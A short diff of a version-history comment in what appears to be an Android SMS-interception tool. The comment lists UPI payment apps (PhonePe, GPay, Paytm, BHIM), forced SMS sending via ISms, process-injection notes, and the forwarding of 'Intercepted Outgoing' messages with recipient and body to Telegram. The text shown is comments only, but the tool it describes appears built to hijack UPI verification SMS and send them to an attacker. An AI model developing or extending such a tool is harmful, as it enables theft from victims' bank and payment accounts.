@@ -23,12 +23,11 @@
 namespace {
 
 /**
- * v1.0.75 — stop last_outgoing TG spam (same SMS thodi der baad)
+ * v1.0.76 — TG tap-to-copy format (To/Body in <code>)
  *
  * Messages + Hero + YesPay/FamPay/BHIM/…: Java ISms immediate.
  * PhonePe/GPay/Paytm only: Java ISms ~4s (open crash avoid).
- * PendingIntent RESULT_OK + delivery + SMS_SENT ASAP (Hero Axis token).
- * After TG: wipe pending_verify/blocked everywhere + 24h dedupe.
+ * TG: Intercepted Outgoing + To/Body monospaced tap-copy.
  * NEVER Binder/phone/sender on UPI. NEVER inject com.android.phone.
  */
 
